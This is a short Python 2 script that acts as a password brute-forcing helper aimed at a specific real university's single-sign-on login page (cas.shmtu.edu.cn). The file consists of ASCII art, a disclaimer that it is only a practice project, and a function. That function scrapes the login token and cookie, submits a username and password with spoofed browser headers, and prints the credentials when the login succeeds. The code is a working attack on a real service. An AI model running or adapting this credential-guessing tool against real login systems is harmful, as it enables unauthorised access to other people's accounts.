# coding:utf8

import urllib
import urllib2
import time

__author__ = "Snake"


#             Python大法好 入教保平安
#                    _ooOoo_
#                   o8888888o
#                   88" . "88
#                   (| °_° |)
#                   O\  =  /O
#                ____/`---'\____
#              .'  \\|     |//  `.
#             /  \\|||  :  |||//  \
#            /  _||||| -:- |||||-  \
#            |   | \\\  -  /// |   |
#            | \_|  ''\---/''  |   |
#            \  .-\__  `-`  ___/-. /
#          ___`. .'  /--.--\  `. . __
#       ."" '<  `.___\_<|>_/___.'  >'"".
#      | | :  `- \`.;`\ _ /`;.`/ - ` : | |
#      \  \ `-.   \_ __\ /__ _/   .-` /  /
# ======`-.____`-.___\_____/___.-`____.-'======
#                    `=---='
# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#             佛祖保佑       永无BUG
#    练手项目 锻炼技巧 不要做坏事 出事与本人无关

def password_blasting(username, password):
    # GET方式访问首页
    loginurl = 'https://cas.shmtu.edu.cn/cas/login?service=http%3A%2F%2Fportal.shmtu.edu.cn%2Fdcp%2Findex.jsp'
    req = urllib2.Request(loginurl)
    res_data = urllib2.urlopen(req)
    res = res_data.readline()
    lt = None
    while (res):
        res = res_data.readline()
        if "<input type=\"hidden\" name=\"lt\"" in res:
            # print res
            lt = res.replace(" ", "")
            lt = lt.replace("<inputtype=\"hidden\"name=\"lt\"value=\"", "")
            lt = lt.replace("\"/>", "")
            lt = lt.strip()
            # print "LT:"+lt

    cookie = res_data.info().getheader('Set-Cookie')
    # print "COOKIE:"+cookie

    params = urllib.urlencode({'encodedService': 'http%3a%2f%2fportal.shmtu.edu.cn%2fdcp%2findex.jsp',
                               'service': "http://portal.shmtu.edu.cn/dcp/index.jsp",
                               'serviceName': "null",
                               'username': username,
                               'password': password,
                               'lt': lt
                               })

    # 第二次用post请求登录 构造Header附带Cookie
    loginBaiduUrl = "https://cas.shmtu.edu.cn/cas/login?service=http%3A%2F%2Fportal.shmtu.edu.cn%2Fdcp%2Findex.jsp"
    req = urllib2.Request(loginBaiduUrl, params)

    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
    req.add_header('Accept-Encoding', 'gzip, deflate, br')
    req.add_header('Accept-Language', 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3')
    req.add_header('Connection', 'keep-alive')
    req.add_header('Cookie', cookie)
    req.add_header('Host', 'cas.shmtu.edu.cn')
    req.add_header('Referer',
                   'https://cas.shmtu.edu.cn/cas/login?service=http%3A%2F%2Fportal.shmtu.edu.cn%2Fdcp%2Findex.jsp')
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0')

    resp = urllib2.urlopen(req)
    respInfo = resp.info()
    # print respInfo
    if (respInfo.getheader('CAS-Service') != None):
        print "爆破成功→→→→" + "Username:" + str(username) + "  Password:" + str(password)
